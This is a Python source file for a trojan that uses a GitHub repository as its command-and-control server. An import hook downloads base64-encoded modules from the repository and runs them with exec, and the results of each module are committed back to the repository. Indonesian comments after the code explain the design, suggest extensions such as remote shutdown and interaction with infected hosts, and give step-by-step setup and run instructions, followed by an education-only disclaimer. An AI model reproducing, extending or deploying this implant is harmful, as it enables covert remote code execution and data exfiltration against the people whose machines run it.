import json
import base64
import sys
import time
import types
import random
import threading
import queue
from github3 import login

trojan_id = "abc"
trojan_config = "config/{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = types.ModuleType(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module


def connect_to_github():
    """ You can replace the password in the call to login() below for an
    access token generated by GitHub if your account uses 2FA for access
    (as it should). Easy-to-follow instructions on how to generate this
    token can be found here:
    https://help.github.com/en/github/authenticating-to-github/
    creating-a-personal-access-token-for-the-command-line

    If you choose to use the token, simply replace the 'password'
    attribute for 'token' below and paste the token generated by
    GitHub as a value instead of 'YourPassword'. The code should be:
    gh = login(username="YourUsername", token="YourToken")
    """
    gh = login(username="YourUsername", password="YourPassword")
    repo = gh.repository("YourUsername", "RepositoryName")
    branch = repo.branch("master")
    return gh, repo, branch


def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None


def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    for tasks in configuration:
        if tasks['module'] not in sys.modules:
            exec("import %s" % tasks['module'])

    return configuration


def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", data.encode())
    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # store the result in our repo
    store_module_result(result)
    return


# main trojan loop    
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))

# Program ini adalah contoh dari Trojan Horse atau malware yang menggunakan GitHub sebagai backend untuk menyimpan konfigurasi dan hasil eksekusi modulnya. Berikut adalah alur kerja program ini:

# Import Libraries: Program mengimpor beberapa library yang diperlukan, termasuk json, base64, sys, time, types, random, threading, dan queue. Selain itu, dari modul github3, program mengimpor fungsi login.

# Inisialisasi Variabel: Program mendefinisikan beberapa variabel seperti trojan_id, trojan_config, data_path, trojan_modules, configured, dan task_queue.

# Class GitImporter: Kelas ini berfungsi sebagai import hook untuk memuat modul dari repositori GitHub. Ini memiliki dua metode utama:

# find_module(): Metode ini mencoba menemukan modul yang diminta. Jika konfigurasi telah dilakukan (configured), maka akan mencoba mengambil konten modul dari repositori GitHub.
# load_module(): Metode ini memuat modul yang diminta ke dalam namespace dan menambahkannya ke sys.modules.

# Fungsi-fungsi Pendukung:

# connect_to_github(): Fungsi ini melakukan otentikasi dengan GitHub menggunakan kredensial pengguna dan mengembalikan objek github, repository, dan branch.
# get_file_contents(filepath): Fungsi ini mengambil konten dari file di repositori GitHub.
# get_trojan_config(): Fungsi ini mengambil konfigurasi Trojan dari repositori GitHub. Konfigurasi tersebut kemudian di-decode dari base64 dan disimpan dalam variabel configuration.
# store_module_result(data): Fungsi ini mengirim hasil eksekusi modul ke repositori GitHub.
# Fungsi module_runner(module): Fungsi ini mengeksekusi modul yang diberikan sebagai argumen, dan menyimpan hasil eksekusi modul ke dalam repositori GitHub menggunakan fungsi store_module_result(). Ini juga menggunakan task_queue untuk mengatur eksekusi modul secara konkuren.

# Main Trojan Loop: Program mengatur sys.meta_path agar menggunakan GitImporter. Loop utama (while True) terdiri dari dua bagian utama:

# Mengambil konfigurasi Trojan menggunakan get_trojan_config(), lalu menjalankan setiap modul yang diberikan dalam konfigurasi dalam thread terpisah menggunakan fungsi module_runner().
# Setelah menjalankan semua modul yang diperlukan, program tidur untuk jangka waktu acak sebelum mengambil konfigurasi berikutnya.
# Program ini berjalan terus menerus, terus mengambil konfigurasi baru dari repositori GitHub, menjalankan modul-modul yang diberikan, dan menyimpan hasilnya kembali ke repositori.
# ================================================================================================================================================================================================================================================================================================== #

# baik, mari kita bahas fungsi, manfaat, penggunaan, dan pengembangan dari program ini:

# Fungsi:
# Import Libraries: Mengimpor library yang diperlukan untuk menjalankan program, termasuk untuk koneksi ke GitHub, manipulasi data, dan manajemen thread.

# Class GitImporter: Digunakan sebagai import hook untuk memuat modul dari repositori GitHub. Hal ini memungkinkan program untuk dinamis memuat dan mengeksekusi kode modul yang tersedia di repositori tersebut.

# Fungsi-fungsi Pendukung: Berbagai fungsi seperti connect_to_github(), get_file_contents(), get_trojan_config(), dan store_module_result() digunakan untuk mengelola koneksi ke GitHub, mengambil konfigurasi Trojan, serta menyimpan dan mengambil file dari repositori.

# Fungsi module_runner(module): Bertanggung jawab untuk menjalankan modul yang diberikan dan menyimpan hasil eksekusi modul tersebut ke repositori GitHub.

# Main Trojan Loop: Berisi loop utama yang berjalan terus-menerus untuk mengambil konfigurasi baru, menjalankan modul-modul yang diberikan dalam thread terpisah, dan tidur untuk jangka waktu tertentu sebelum mengambil konfigurasi berikutnya.

# Manfaat Penggunaan:
# Flexibilitas: Dengan menggunakan repositori GitHub untuk menyimpan konfigurasi dan modul-modulnya, program ini menjadi lebih fleksibel dan mudah diubah tanpa perlu memodifikasi kode sumbernya secara langsung. Cukup dengan memperbarui repositori GitHub, Trojan dapat dikonfigurasi ulang atau memperbarui modul-modulnya.

# Kemampuan Eksekusi Dinamis: Dengan menggunakan import hook, program dapat dinamis memuat dan mengeksekusi modul-modul yang tersedia di repositori GitHub tanpa perlu menginstal ulang atau memodifikasi kode sumbernya.

# Dukungan untuk Konfigurasi Multi-Modul: Program ini mendukung konfigurasi dengan banyak modul, sehingga memungkinkan untuk menjalankan beberapa tugas atau operasi secara bersamaan.

# Pengembangan:
# Keamanan: Program ini memiliki potensi risiko keamanan karena menggunakan repositori GitHub sebagai backend untuk menyimpan modul dan konfigurasinya. Pengembang dapat mempertimbangkan cara-cara untuk meningkatkan keamanan seperti enkripsi komunikasi antara Trojan dan GitHub, autentikasi ganda, atau metode keamanan lainnya.

# Optimalisasi Kinerja: Dalam implementasi nyata, program ini mungkin memerlukan optimalisasi kinerja untuk mengurangi latensi dalam pengambilan konfigurasi dan eksekusi modul, serta pengelolaan sumber daya seperti memori dan CPU.

# Pengembangan Fitur: Pengembang dapat memperluas fungsionalitas program dengan menambahkan fitur-fitur baru seperti pemantauan dan logging, kemampuan untuk mematikan Trojan secara remote, atau interaksi dengan sistem yang terinfeksi.

# Kompabilitas Platform: Memastikan bahwa program ini kompatibel dengan berbagai platform dan lingkungan sistem operasi, serta mengelola dependensi dan persyaratan konfigurasi dengan baik.

# Manajemen Versi: Penting untuk memiliki sistem manajemen versi yang baik untuk memantau perubahan, pembaruan, dan peningkatan program secara berkala. Hal ini juga membantu dalam pemulihan jika terjadi kegagalan atau kerusakan pada Trojan.

# ================================================================================================================================================================================================================================================================================================================================================== #

# Berikut adalah cara penggunaan program Trojan ini:

# Persiapan Repositori GitHub:

# Mulailah dengan membuat repositori di GitHub yang akan digunakan untuk menyimpan konfigurasi dan modul-modul Trojan.
# Pastikan repositori tersebut memiliki struktur direktori yang sesuai dengan apa yang diharapkan oleh program Trojan, seperti memiliki direktori config untuk menyimpan file konfigurasi dan direktori modules untuk menyimpan modul-modul yang akan dieksekusi.

# Konfigurasi Repositori:

# Pastikan repositori memiliki file konfigurasi yang sesuai dengan format yang diharapkan oleh program Trojan. File konfigurasi ini dapat berisi daftar modul-modul yang akan dieksekusi, serta konfigurasi tambahan seperti interval waktu atau parameter lainnya.

# Menjalankan Trojan:

# Pastikan Python telah terinstal di sistem Anda.
# Salin kode program Trojan ke dalam file Python, misalnya trojan.py.
# Ganti nilai trojan_id, YourUsername, dan RepositoryName sesuai dengan informasi yang sesuai dengan akun GitHub dan repositori yang telah Anda siapkan.
# Jalankan program Trojan dengan menjalankan perintah python trojan.py dari terminal atau lingkungan Python Anda.

# Memantau Eksekusi Trojan:

# Setelah Trojan dijalankan, program akan mulai mengambil konfigurasi dari repositori GitHub dan mengeksekusi modul-modul yang ditentukan dalam konfigurasi tersebut.
# Anda dapat memantau eksekusi Trojan dengan memeriksa output yang dihasilkan oleh program, serta dengan melihat perubahan yang terjadi di repositori GitHub.

# Memperbarui Konfigurasi atau Modul-modul:

# Jika Anda ingin mengubah konfigurasi Trojan atau memperbarui modul-modul yang dieksekusi, Anda dapat melakukan perubahan langsung di repositori GitHub.
# Trojan akan secara otomatis mengambil perubahan tersebut pada interval waktu tertentu yang telah ditentukan dalam kode program.

# Mematikan Trojan:

# Untuk menghentikan Trojan, Anda dapat menghentikan eksekusi program secara manual atau dengan mengubah logika loop utama dalam kode program.
# Penting untuk diingat bahwa penggunaan Trojan atau perangkat lunak sejenis ini untuk tujuan ilegal atau tanpa izin adalah melanggar hukum. Informasi ini disediakan hanya untuk tujuan edukasi dan pemahaman.




